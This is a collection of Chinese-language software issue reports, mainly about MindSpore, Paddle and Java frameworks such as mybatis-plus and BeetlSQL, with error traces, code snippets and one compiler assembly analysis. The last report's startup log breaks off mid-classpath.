【MindSpore】【Ascend】【C类】【PAMTRI】PoseEstNet部分1P训练报错的问题,"一 问题/现象 1、在执行1p训练时，出现以下报错： 2、运行启动脚本时，出现以下报错： 将脚本中的Python3改为python，则不会出现此报错，建议所有脚本都使用python 3、使用B类数据集执行训练报错： 二、环境信息 --CANN 版本: (CANN 5.0.2.B058) --Driver版本：（Driver 21.0.2） --MindSpore 版本: 1.3.0 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --操作系统架构：x86架构   <code>: root@dfd36e8cc14b:/data2/zhangjj/PAMTRI/PoseEstNet# tail -f train.log Traceback (most recent call last): File ""train.py"", line 76, in &lt;module&gt; dataset = create_dataset(cfg, args.data_dir, is_train=True) File ""/data2/zhangjj/PAMTRI/PoseEstNet/src/dataset/dataset.py"", line 27, in create_dataset data = VeRiDataset(cfg, data_dir, is_train) File ""/data2/zhangjj/PAMTRI/PoseEstNet/src/dataset/veri.py"", line 36, in __init__ self.db = self._get_db() File ""/data2/zhangjj/PAMTRI/PoseEstNet/src/dataset/veri.py"", line 53, in _get_db joint = [int(row[j*3+3]), int(row[j*3+4]), int(row[j*3+5])] ValueError: invalid literal for int() with base 10: '121.667' Traceback (most recent call last): File ""train.py"", line 23, in &lt;module&gt; import mindspore ModuleNotFoundError: No module named 'mindspore' root@722a8a47a713:/data/zhangjj/PAMTRI/PoseEstNet/scripts# tail -f ../train.log Traceback (most recent call last): File ""train.py"", line 91, in &lt;module&gt; load_param_into_net(network, param_dict) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/serialization.py"", line 551, in load_param_into_net _load_dismatch_prefix_params(net, parameter_dict, param_not_load, strict_load) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/serialization.py"", line 586, in _load_dismatch_prefix_params _update_param(param, new_param, strict_load) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/serialization.py"", line 96, in _update_param raise RuntimeError(msg) RuntimeError: Net parameters conv1.weight shape((64, 3, 3, 3)) different from parameter_dict's((128, 64, 1, 1))"
layer.open弹窗为半透明的,"中间蓝色较大的为layer.open弹窗，透明现象偶尔出现，且透明度随机 ![弹窗透明] 代码如下   <code>: layer_Message=layer.open({ itle:""&lt;center style='padding-top:7px;'&gt; &lt;h3&gt;质控消息弹窗&lt;/h3&gt;&lt;/center&gt;"", type : 1, area : [ widthS + ""px"", heightH + ""px"" ], fixed : true, // 不固定 maxmin : true, shadeClose : true, shade : 0.1, content : dataArray.join(""""), resize : true, btn:[""确定""], yes:function(index,layero){ layer.close(index); }, end:function(index){ } })"
postgresql好像没有考虑主键自增,"PostgresStyle.java 17行:   <code>: @Override public int getIdType(Class c,String idProperty) { List&lt;Annotation&gt; ans = BeanKit.getAllAnnoation(c, idProperty); int idType = DBStyle.ID_ASSIGN; // 默认是自增长 for (Annotation an : ans) { if (an instanceof SeqID) { idType = DBStyle.ID_SEQ; //seq 总是优先 break; } else if (an instanceof AssignID) { idType = DBStyle.ID_ASSIGN; } } return idType; }"
使用QueryWrapper进行条件嵌套拼接时，如果条件是递归生成的，如何对每次循环生成的条件都加个括号,"当前使用版本 com.baomidou:mybatis-plus:3.0.6 之前使用的是2.x版本，使用过程中发现 or 或 and 嵌套时容易混乱，就升级到了最新版本，发现最新版本似乎更无法满足需求，不确定是本人使用问题，还是确实无法实现？ 代码如下：   <code>: // 接收到前端自定义格式的查询条件(JSON格式)，makeWrapper进行处理 public Page selectOfComplex(QueryCondition queryCondition, String viewName, MenuCode menuCode, QueryWrapper&lt;T&gt; backCondition) { // 如何在backCondition后新拼接的条件加上一个括号？？？？？？？？？？？？？？ makeWrapper(queryMap, viewName, backCondition , true); //尝试方式一： 结果多了个and makeWrapper(queryMap, viewName, backCondition.apply(""("") , true).apply("")""); //尝试方式二： sql是正确了，但是参数都是null wrapper.and(i -&gt; makeWrapper(queryMap, viewName, new QueryWrapper&lt;&gt;(), true)); ... } //此方法会把json格式的查询条件通过反射组装成QueryWrapper private QueryWrapper&lt;T&gt; makeWrapper(Map&lt;Enums.DbOperation, Object&gt; queryMap, String viewName, QueryWrapper&lt;T&gt; queryWrapper, Boolean isAnd) { Iterator&lt;Map.Entry&lt;Enums.DbOperation, Object&gt;&gt; entries = queryMap.entrySet().iterator(); while(entries.hasNext()) { if () { //如果发现 AND 或 OR 的key时 会再次递归拼接 makeWrapper(map, viewName, queryWrapper, isAnd); ... } else { Method method = queryWrapper.getClass().getMethod(entry.getKey().getValue(), Object.class, Object.class); Map&lt;String, Object&gt; maps = this.paramsTypeConvert(JSON.parseObject(JSON.toJSONString(entry.getValue()), Map.class), viewName); for (Map.Entry&lt;String, Object&gt; map : maps.entrySet()) { method.invoke(queryWrapper, map.getKey(), map.getValue()); } } } }"
DateUtil plusYears、plusMonths bug,"java8中 Instant plus 不支持 plusYears 和 plusMonths   <code>: @Override public Instant plus(long amountToAdd, TemporalUnit unit) { if (unit instanceof ChronoUnit) { switch ((ChronoUnit) unit) { case NANOS: return plusNanos(amountToAdd); case MICROS: return plus(amountToAdd / 1000_000, (amountToAdd % 1000_000) * 1000); case MILLIS: return plusMillis(amountToAdd); case SECONDS: return plusSeconds(amountToAdd); case MINUTES: return plusSeconds(Math.multiplyExact(amountToAdd, SECONDS_PER_MINUTE)); case HOURS: return plusSeconds(Math.multiplyExact(amountToAdd, SECONDS_PER_HOUR)); case HALF_DAYS: return plusSeconds(Math.multiplyExact(amountToAdd, SECONDS_PER_DAY / 2)); case DAYS: return plusSeconds(Math.multiplyExact(amountToAdd, SECONDS_PER_DAY)); } throw new UnsupportedTemporalTypeException(""Unsupported unit: "" + unit); } return unit.addTo(this, amountToAdd); }"
利用CAPI实现seq2seq预测模型中生成序列概率获取,"请问我在用CAPI实现seq2seq预测模型时，只能得到生成序列的id，但是无法得到生成序列的打分值。请问下原因？ 附：预测代码   <code>: int sentence_ids[] = {0, 33015, 10213, 4, 87713, 12908, 630; paddle_ivector sentence = paddle_ivector_create( sentence_ids, sizeof(sentence_ids) / sizeof(int), false, false); CHECK(paddle_arguments_set_ids(in_args, 0, sentence)); int seq_pos_array[] = {0, sizeof(sentence_ids) / sizeof(int)}; paddle_ivector seq_pos = paddle_ivector_create( seq_pos_array, sizeof(seq_pos_array) / sizeof(int), false, false); CHECK(paddle_arguments_set_sequence_start_pos(in_args, 0, 0, seq_pos)); paddle_arguments out_args = paddle_arguments_create_none(); CHECK(paddle_gradient_machine_forward(machine, in_args, out_args, false)); uint64_t total_size = 0; paddle_arguments_get_size(out_args, &amp;total_size); cout &lt;&lt; ""#63\t"" &lt;&lt; total_size &lt;&lt; endl; paddle_ivector ivec = paddle_ivector_create_none(); paddle_arguments_get_ids(out_args, 0, ivec); uint64_t vec_size = 0; paddle_ivector_get_size(ivec, &amp;vec_size); int* array; paddle_ivector_get(ivec, &amp;array); for (uint64_t i = 0; i &lt; vec_size; i++) { cout &lt;&lt; array[i] &lt;&lt; endl; }"
[GraphKernel]Compilation crashed in arithmetic_simplify for bert-15classifier,"/device gpu export MS_GRAPH_KERNEL_FLAGS=""--opt_level=1""   <code>: python ${PROJECT_DIR}/../run_classifier.py \ --device_target=""""GPU"""" \ --do_train=""""true"""" \ --do_eval=""""true"""" \ --assessment_method=""""Accuracy"""" \ --device_id=0 \ --epoch_num=100 \ --num_class=15 \ --train_data_shuffle=""""true"""" \ --eval_data_shuffle=""""false"""" \ --train_batch_size=32 \ --eval_batch_size=1 \ --save_finetune_checkpoint_path="""""""" \ --load_pretrain_checkpoint_path=""""/ssd/ssd0/bert_finetuning_ckpt/bert_converted.ckpt"""" \ --load_finetune_checkpoint_path="""""""" \ --train_data_file_path=""""/ssd/ssd0/bert_finetuning_data/tnews/train.tf_record"""" \ --eval_data_file_path=""""/ssd/ssd0/bert_finetuning_data/tnews/dev.tf_record"""" \ --schema_file_path=""""/ssd/ssd0/bert_finetuning_data/tnews/dataset.json"""" &gt; classifier_log.txt [ERROR] KERNEL(32021,python):2021-04-19-11:46:33.725.409 [mindspore/ccsrc/backend/kernel_compiler/kernel_build_info.cc:25] GetInputForhe index [0] is exceed the number of input node [ERROR] SESSION(32021,python):2021-04-19-11:46:33.725.618 [mindspore/ccsrc/backend/session/anf_runtime_algorithm.cc:623] GetInputFormae [kernel_graph_1:dx{[0]: ValueNode&lt;Primitive&gt; StridedSliceGrad, [1]: [CNode]18682}] has a invalid input format trace: In file /home/chenlei/mindspore/build/package/mindspore/ops/_grad/grad_array_ops.py(627)/ dx = input_grad(dout, shape_op(x), bend, strides)"
新增微服务，controller头上用了@Inner(value = false)，其中一个接口用了feign调用，报用户凭证已过期,"环境信息 pigx版本: 3.9 是否修改包名: 是 调用feign的controller： @Inner(value = false) @DY @AllArgsConstructor @RequestMapping(""/unit"" ) public class SysUnitController { @GetMapping(""/test/{username}"" ) public R test(@PathVariable String username) { return R.ok(""username is "" + username); } } feign定义： @FeignClient(contextId = ""remoteUnitService"", value= ServiceNameConstants.CMS_SERVICE) public interface RemoteUnitService { } cotroller相关方法上也加了inner @innerloop @GetMapping(""/ptest"" ) public R getSysUnitPage2(Page page, UnitDTO unitDTO) { return R.ok(sysUnitService.getUnitWithExtendPage(page, unitDTO)); } postman调/page接口报下面信息 { ""code"": 1, ""msg"": ""用户凭证已过期"", ""data"": ""Full authentication is required to access this resource"" } postman调/test接口没问题   <code>: private final RemoteUnitService sysUnitService; @GetMapping(""/page"" ) public R getSysUnitPage(Page page, UnitDTO unitDTO) { return R.ok(sysUnitService.getSysUnitPage(page, unitDTO, SecurityConstants.FROM_IN)); } @GetMapping(""/sysunit/ptest"" ) R getSysUnitPage(@RequestParam(""page"") Page page, @RequestParam(""unitDTO"") UnitDTO unitDTO, @RequestHeader(SecurityConstants.FROM) String from);"
【spec525性能分析】SR-add开启后引入iv过多,"mc.c 函数：frame_init_lowres_core C源码： SR-add开启后 汇编： 问题1： w0的存在完全冗余，cvt(w0)可以外提，多引入一个iv 问题2： SR-add做的过于激进导致IV数量激增,共14个iv 其中x11,x9,x8,x7 可归一为一个iv, 后续ldr使用[base, iv] 模式，base分别为dstc/dstv/dsth/dst0，iv为x 其中x14,x4,x6可以使用x6（src2 + 2x）作为iv x14,x4 表示为 x6 + offset模式 x13,x3,x1; x12,x2,x10同理；所以最后只需4个iv即可 修改建议： 最贴近iread/iassign的add不作为SR-add的目标，因为这样可以充分利用后端ISA能力又不引入新的iv，同时base,offset需要进行规范化,将地址计算充分的通过 分配率和结合律 将base和offset模式做成如下模式： 1） 如果地址中不不存在常数，最好将当前循环的循环不变量的计算结果作为base，其余提出作为iv，这样相同步进、初值不同的iv均可归一，x11,x9,x8,x7就是这种情况 2) 如果地址中有常数，将常数作为offset，base作为iv，如果一系列的base + const中常数偏移存在负数（-c），可将base-c作为iv外提，其余常数+c后作为offset   <code>: static void frame_init_lowres_core( uint8_t *src0, uint8_t *dst0, uint8_t *dsth, uint8_t *dstv, uint8_t *dstc, int src_stride, int dst_stride, int width, int height ) { for( int y = 0; y &lt; height; y++ ) { uint8_t *src1 = src0+src_stride; uint8_t *src2 = src1+src_stride; for( int x = 0; x&lt;width; x++ ) { // slower than naive bilinear, but matches asm #define FILTER(a,b,c,d) ((((a+b+1)&gt;&gt;1)+((c+d+1)&gt;&gt;1)+1)&gt;&gt;1) dst0[x] = FILTER(src0[2*x ], src1[2*x ], src0[2*x+1], src1[2*x+1]); dsth[x] = FILTER(src0[2*x+1], src1[2*x+1], src0[2*x+2], src1[2*x+2]); dstv[x] = FILTER(src1[2*x ], src2[2*x ], src1[2*x+1], src2[2*x+1]); dstc[x] = FILTER(src1[2*x+1], src2[2*x+1], src1[2*x+2], src2[2*x+2]); #undef FILTER } src0 += src_stride*2; dst0 += dst_stride; dsth += dst_stride; dstv += dst_stride; dstc += dst_stride; } } 889 .L.482__4: 890 ldr w10, [x29,#20] 891 cmp w10, #0 892 ble .L.482__1 893 mov w0, #0 894 ldr w10, [x29,#20] 895 lsl w2, w10, #1 896 ldr w10, [x29,#24] 897 add x5, x20, w10, SXTW // x5 = src1 = scr0 + src_stride 898 mov x7, x23 &lt;==== ""dst0 + x"" 899 mov x8, x24 &lt;==== ""dsth + x"" 900 mov x9, x25 &lt;==== ""dstv + x"" 901 mov x11, x26 &lt;==== ""dstc + x"" 902 ldr w10, [x29,#24] 903 add x6, x5, w10, SXTW // x6 = src2 + 2x 904 mov x10, x20 &lt;===== ""src0 + 2x"" 905 mov x1, x5 &lt;===== ""src1 + 2x"" 906 add x18, x5, w2, SXTW // x18 = src1 + width * 2 907 add x2, x20, #1 &lt;===== ""src0 + 2x + 1"" 908 add x12, x20, #2 &lt;===== ""src0 + 2x + 2"" 909 add x3, x5, #1 &lt;===== ""src1 + 2x + 1"" 910 add x13, x5, #2 &lt;===== ""src1 + 2x + 2"" 911 add x4, x6, #1 &lt;===== ""src2 + 2x + 1"" 912 add x14, x6, #2 &lt;===== ""src2 + 2x + 2"" 913 .L.482__2: 914 ldrb w15, [x10] 915 ldrb w27, [x1] 916 add w15, w15, w27 917 add w15, w15, #1 918 asr w15, w15, #1 919 ldrb w27, [x2] 920 ldrb w28, [x3] 921 add w27, w27, w28 922 add w27, w27, #1 923 asr w27, w27, #1 924 add w15, w15, w27 925 add w15, w15, #1 926 asr w15, w15, #1 927 strb w15, [x7] 928 ldrb w15, [x2] 929 ldrb w27, [x3] 930 add w15, w15, w27 931 add w15, w15, #1 932 asr w15, w15, #1 933 ldrb w27, [x12] 934 ldrb w28, [x13] 935 add w27, w27, w28 936 add w27, w27, #1 937 asr w27, w27, #1 938 add w15, w15, w27 939 add w15, w15, #1 940 asr w15, w15, #1 941 strb w15, [x8] 942 ldrb w15, [x1] 943 ldrb w27, [x6] 944 add w15, w15, w27 945 add w15, w15, #1 946 asr w15, w15, #1 947 sxtw x27, w0 948 add x27, x27, x5 949 ldrb w27, [x27,#1] 950 ldrb w28, [x4] 951 add w27, w27, w28 952 add w27, w27, #1 953 asr w27, w27, #1 954 add w15, w15, w27 955 add w15, w15, #1 956 asr w15, w15, #1 957 strb w15, [x9] 958 sxtw x15, w0 959 add x15, x15, x5 960 ldrb w15, [x15,#1] 961 ldrb w27, [x4] 962 add w15, w15, w27 963 add w15, w15, #1 964 asr w15, w15, #1 965 sxtw x27, w0 966 add x27, x27, x5 967 ldrb w27, [x27,#2] 968 ldrb w28, [x14] 969 add w27, w27, w28 970 add w27, w27, #1 971 asr w27, w27, #1 972 add w15, w15, w27 973 add w15, w15, #1 974 asr w15, w15, #1 975 strb w15, [x11] 976 add x11, x11, #1 977 add x9, x9, #1 978 add x8, x8, #1 979 add x7, x7, #1 980 add w0, w0, #2 981 add x14, x14, #2 982 add x4, x4, #2 983 add x13, x13, #2 984 add x3, x3, #2 985 add x12, x12, #2 986 add x2, x2, #2 987 add x6, x6, #2 988 add x1, x1, #2 989 add x10, x10, #2 990 cmp x1, x18 991 blo .L.482__2 992 .L.482__1: 993 add x20, x20, x22 994 add x23, x23, x19 995 add x24, x24, x19 996 add x25, x25, x19 997 add x26, x26, x19 998 add w21, w21, #1 999 ldr w10, [x29,#16] 1000 cmp w21, w10 1001 blt .L.482__4"
[mindnlp] nn.BatchNorm1d官网上没有描述，另外调用时不支持batch输入,"/ 硬件环境: CPU : -- MindSpore version :2.0.0.dev20221108 -- Python version :3.7.15 -- OS platform and distribution : windows (/): /mode pynative   <code>: import numpy as np import mindspore from mindspore import nn, Tensor batch_norm1d = nn.BatchNorm1d(100) input_a = Tensor(np.random.randn(20, 100), mindspore.float32) output_a = batch_norm1d(input_a) # ok input_b = Tensor(np.random.randn(20, 100, 100), mindspore.float32) output_b = batch_norm1d(input_b) # error"
使用c  接口的多线程，报segment fault,"报这个错误： 当multi_threads值为1时，可以正常预测   <code>: DLOG(INFO) &lt;&lt; ""create main_predictor""; std::unique_ptr&lt;paddle::PaddlePredictor&gt; main_predictor = CreatePaddlePredictor(config); predictors.emplace_back(std::move(main_predictor)); DLOG(INFO) &lt;&lt; ""create multi predictors""; for (int i = 1; i &lt; multi_threads; ++i){ predictors.emplace_back(std::move(main_predictor-&gt;Clone())); } DLOG(INFO) &lt;&lt; ""finish predictors"";"
[CT][MS][SparseSegmentSqrtN]在ascend上出现RuntimeError: Sync stream failed:Ascend_2报错,"算子在在ascend上，在已经将所有so文件放入/root/sofiles/目录下，再 sh /root/sofiles/sofiles.sh 和 python /root/sofiles/insert_selfname.py，使用master包 执行 运行用例 test_p_sparsesegmentsqrtn_1d_shape_20_float16_int32_int32 出现RuntimeError: Sync stream failed:Ascend_2 def test_p_sparsesegmentsqrtn_1d_shape_20_float16_int32_int32(): size = 20 num = int(np.random.randint(low=1, high=20, size=1)) x = Tensor(np.random.randn(20), dtype=mindspore.float16) indices = Tensor(np.sort(np.random.randint(20, size=size)), dtype=mindspore.int32) segment_ids = Tensor(get_random_segment_ids(num, size), dtype=mindspore.int32) fact = SparseSegmentSqrtNMock(inputs=[x, indices, segment_ids]) fact.forward_cmp() test_sparsesegmentsqrtn.py:45: ../share/ops/primitive/sparsesegmentsqrtn_ops.py:125: in grad_cmp input_grad_ms = self.grad_mindspore_impl() ../share/ops/primitive/sparsesegmentsqrtn_ops.py:82: in grad_mindspore_impl self.x_ms, self.indices_ms, self.segment_ids_ms, Tensor(self.output_grad_np)) /root/archiconda3/envs/nisong3.72/lib/python3.7/site-packages/mindspore/nn/cell.py:620: in call raise err /root/archiconda3/envs/nisong3.72/lib/python3.7/site-packages/mindspore/nn/cell.py:616: in call output = self._run_construct(args, kwargs) /root/archiconda3/envs/nisong3.72/lib/python3.7/site-packages/mindspore/nn/cell.py:418: in <em>run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/archiconda3/envs/nisong3.72/lib/python3.7/site-packages/mindspore/ops/composite/base.py:404: in after_grad return grad</em>(fn)(*args, **kwargs) /root/archiconda3/envs/nisong3.72/lib/python3.7/site-packages/mindspore/common/api.py:99: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/nisong3.72/lib/python3.7/site-packages/mindspore/ops/composite/base.py:393: in after_grad out = <em>pynative_executor(fn, grad</em>.sens_param, *args, **kwargs) test_p_sparsesegmentsqrtn_error_input_value_segment_ids_not_sorted RuntimeError: Sync stream error!   <code>: fact.grad_cmp()"
iOS9.0之前系统未自带平方字体(PingFangSC-Light) 故启动程序闪退,"位置： NewHotBlogTableViewCell.m 我手机系统为8.4 运行到这里会报错 [UIFont fontWithName:@""PingFangSC- Light"" size:10.0]为nil 可否在这里加一个判断   <code>: [attributedString addAttribute:NSFontAttributeName value:[UIFont fontWithName:@""PingFangSC-Light"" size:10.0] range:NSMakeRange(0, attributedString.length)];"
Move optional_helper from abi_helper to dataset,"Task Use this template for task tracking kind/task Task Description Under NNIE complier option of Lite, the complier does not support feature, thus we move it out of dual_abi_helper.h   <code>: std::optional"
BeetlSql2.12.10版本springboot2无事务配置读取操作出现连接关闭的问题,"问题详细描述 如果默认事务配置成PROPAGATION_SUPPORTS service中如果同时执行两条查询操作： fun getById(newsId: Int): News? { var news = newsDao.single(newsId) return newsDao.getById(newsId) } 就会出现org.beetl.sql.core.BeetlSQLException: java.sql.SQLException: Connection is closed异常，如果默认事务配置成：PROPAGATION_REQUIRED,readOnly则没有问题。 猜想：可能是没有事务上下文的时候，执行select操作之后会自动关闭连接，导致后续操作异常 自动事务配置： @guhaibin fun txAdvice(): TransactionInterceptor { val properties = Properties(); properties.setProperty(""add*"", ""PROPAGATION_REQUIRED,-Exception""); properties.setProperty(""save*"", ""PROPAGATION_REQUIRED,-Exception""); ... //出问题的地方 properties.setProperty(""<em>"", ""PROPAGATION_SUPPORTS,-Exception""); //properties.setProperty(""</em>"", ""PROPAGATION_REQUIRED,readOnly,-Exception""); }   <code>: val txAdvice = TransactionInterceptor(transactionManager, properties); return txAdvice;"
单应用启动报错,"""D:\Program Files\Java\jdk1.8.0_181\bin\java.exe"" -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true ""-javaagent:D:\idea\IntelliJ IDEA 2019.1.3\lib\idea_rt.jar=62748:D:\idea\IntelliJ IDEA 2019.1.3\bin"" -Dfile.encoding=UTF-8 -classpath ""D:\Program Files\Java\jdk1.8.0_181\jre\lib\charsets.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\deploy.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\access-bridge-64.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\cldrdata.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\dnsns.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\jaccess.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\jfxrt.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\localedata.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\nashorn.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\sunec.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\sunjce_provider.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\sunmscapi.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\sunpkcs11.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\ext\zipfs.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\javaws.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\jce.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\jfr.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\jfxswt.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\jsse.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\management-agent.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\plugin.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\resources.jar;D:\Program Files\Java\jdk1.8.0_181\jre\lib\rt.jar;E:\压缩包\RuoYi-fast\target\classes;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter\2.1.1.RELEASE\spring-boot-starter-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot\2.1.1.RELEASE\spring-boot-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-autoconfigure\2.1.1.RELEASE\spring-boot-autoconfigure-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-logging\2.1.1.RELEASE\spring-boot-starter-logging-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\ch\qos\logback\logback-classic\1.2.3\logback-classic-1.2.3.jar;C:\Users\微软中国.m2\repository\ch\qos\logback\logback-core\1.2.3\logback-core-1.2.3.jar;C:\Users\微软中国.m2\repository\org\apache\logging\log4j\log4j-to-slf4j\2.11.1\log4j-to-slf4j-2.11.1.jar;C:\Users\微软中国.m2\repository\org\apache\logging\log4j\log4j-api\2.11.1\log4j-api-2.11.1.jar;C:\Users\微软中国.m2\repository\org\slf4j\jul-to-slf4j\1.7.25\jul-to-slf4j-1.7.25.jar;C:\Users\微软中国.m2\repository\javax\annotation\javax.annotation-api\1.3.2\javax.annotation-api-1.3.2.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-core\5.1.3.RELEASE\spring-core-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-jcl\5.1.3.RELEASE\spring-jcl-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\yaml\snakeyaml\1.23\snakeyaml-1.23.jar;C:\Users\微软中国.m2\repository\net\bytebuddy\byte-buddy\1.9.5\byte-buddy-1.9.5.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-aop\2.1.1.RELEASE\spring-boot-starter-aop-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-aop\5.1.3.RELEASE\spring-aop-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\aspectj\aspectjweaver\1.9.2\aspectjweaver-1.9.2.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-web\2.1.1.RELEASE\spring-boot-starter-web-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-json\2.1.1.RELEASE\spring-boot-starter-json-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\com\fasterxml\jackson\core\jackson-databind\2.9.7\jackson-databind-2.9.7.jar;C:\Users\微软中国.m2\repository\com\fasterxml\jackson\core\jackson-core\2.9.7\jackson-core-2.9.7.jar;C:\Users\微软中国.m2\repository\com\fasterxml\jackson\datatype\jackson-datatype-jdk8\2.9.7\jackson-datatype-jdk8-2.9.7.jar;C:\Users\微软中国.m2\repository\com\fasterxml\jackson\datatype\jackson-datatype-jsr310\2.9.7\jackson-datatype-jsr310-2.9.7.jar;C:\Users\微软中国.m2\repository\com\fasterxml\jackson\module\jackson-module-parameter-names\2.9.7\jackson-module-parameter-names-2.9.7.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-tomcat\2.1.1.RELEASE\spring-boot-starter-tomcat-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\apache\tomcat\embed\tomcat-embed-core\9.0.13\tomcat-embed-core-9.0.13.jar;C:\Users\微软中国.m2\repository\org\apache\tomcat\embed\tomcat-embed-el\9.0.13\tomcat-embed-el-9.0.13.jar;C:\Users\微软中国.m2\repository\org\apache\tomcat\embed\tomcat-embed-websocket\9.0.13\tomcat-embed-websocket-9.0.13.jar;C:\Users\微软中国.m2\repository\org\hibernate\validator\hibernate-validator\6.0.13.Final\hibernate-validator-6.0.13.Final.jar;C:\Users\微软中国.m2\repository\javax\validation\validation-api\2.0.1.Final\validation-api-2.0.1.Final.jar;C:\Users\微软中国.m2\repository\org\jboss\logging\jboss-logging\3.3.2.Final\jboss-logging-3.3.2.Final.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-web\5.1.3.RELEASE\spring-web-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-webmvc\5.1.3.RELEASE\spring-webmvc-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-expression\5.1.3.RELEASE\spring-expression-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-thymeleaf\2.1.1.RELEASE\spring-boot-starter-thymeleaf-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\org\thymeleaf\thymeleaf-spring5\3.0.11.RELEASE\thymeleaf-spring5-3.0.11.RELEASE.jar;C:\Users\微软中国.m2\repository\org\thymeleaf\thymeleaf\3.0.11.RELEASE\thymeleaf-3.0.11.RELEASE.jar;C:\Users\微软中国.m2\repository\org\attoparser\attoparser\2.0.5.RELEASE\attoparser-2.0.5.RELEASE.jar;C:\Users\微软中国.m2\repository\org\unbescape\unbescape\1.1.6.RELEASE\unbescape-1.1.6.RELEASE.jar;C:\Users\微软中国.m2\repository\org\thymeleaf\extras\thymeleaf-extras-java8time\3.0.2.RELEASE\thymeleaf-extras-java8time-3.0.2.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-devtools\2.1.1.RELEASE\spring-boot-devtools-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\mysql\mysql-connector-java\8.0.13\mysql-connector-java-8.0.13.jar;C:\Users\微软中国.m2\repository\org\mybatis\spring\boot\mybatis-spring-boot-starter\1.3.2\mybatis-spring-boot-starter-1.3.2.jar;C:\Users\微软中国.m2\repository\org\springframework\boot\spring-boot-starter-jdbc\2.1.1.RELEASE\spring-boot-starter-jdbc-2.1.1.RELEASE.jar;C:\Users\微软中国.m2\repository\com\zaxxer\HikariCP\3.2.0\HikariCP-3.2.0.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-jdbc\5.1.3.RELEASE\spring-jdbc-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\springframework\spring-tx\5.1.3.RELEASE\spring-tx-5.1.3.RELEASE.jar;C:\Users\微软中国.m2\repository\org\mybatis\spring\boot\mybatis-spring-boot-autoconfigure\1.3.2\mybatis-spring-boot-autoconfigure-1.3.2.jar;C:\Users\微软中国.m2\repository\org\mybatis\mybatis\3.4.6\mybatis-3.4.6.jar;C:\Users\微软中国.m2\repository\org\mybatis\mybatis-spring\1.3.2\mybatis-spring-1.3.2.jar;C:\Users\微软中国.m2\repository\com\baomidou\mybatis-plus-boot-starter\3.1.0\mybatis-plus-boot-starter-3.1.0.jar;C:\Users\微软中国.m2\repository\com\baomidou\mybatis-plus\3.1.0\mybatis-plus-3.1.0.jar;C:\Users\微软中国.m2\repository\com\baomidou\mybatis-plus-extension\3.1.0\mybatis-plus-extension-3.1.0.jar;C:\Users\微软中国.m2\repository\com\baomidou\mybatis-plus-core\3.1.0\mybatis-plus-core-3.1.0.jar;C:\Users\微软中国.m2\repository\com\baomidou\mybatis-plus-annotation\3.1.0\mybatis-plus-annotation-3.1.0.jar;C:\Users\微软中国.m2\repository\com\github\pagehelper\pagehelper-spring-boot-starter\1.2.5\pagehelper-spring-boot-starter-1.2.5.jar;C:\Users\微软中国.m2\repository\com\github\pagehelper\pagehelper-spring-boot-autoconfigure\1.2.5\pagehelper-spring-boot-autoconfigure-1.2.5.jar;C:\Users\微软中国.m2\repository\com\github\pagehelper\pagehelper\5.1.4\pagehelper-5.1.4.jar;C:\Users\微软中国.m2\repository\com\github\jsqlparser\jsqlparser\1.0\jsqlparser-1.0.jar;C:\Users\微